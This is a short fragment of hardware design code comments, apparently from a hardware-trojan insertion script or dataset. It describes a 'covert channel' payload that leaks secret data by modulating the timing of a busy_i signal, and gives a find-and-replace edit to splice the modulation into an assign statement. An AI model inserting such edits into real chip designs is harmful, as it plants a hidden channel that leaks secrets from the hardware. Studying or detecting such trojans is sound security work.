 ...
 * Payload: Modulate timing of busy_i based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of busy_i
//
// Integration Script Must Modify:
//
// IF busy_i is timing-sensitive:
//   Find: assign busy_i = ready_signal;
//   Replace: assign busy_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
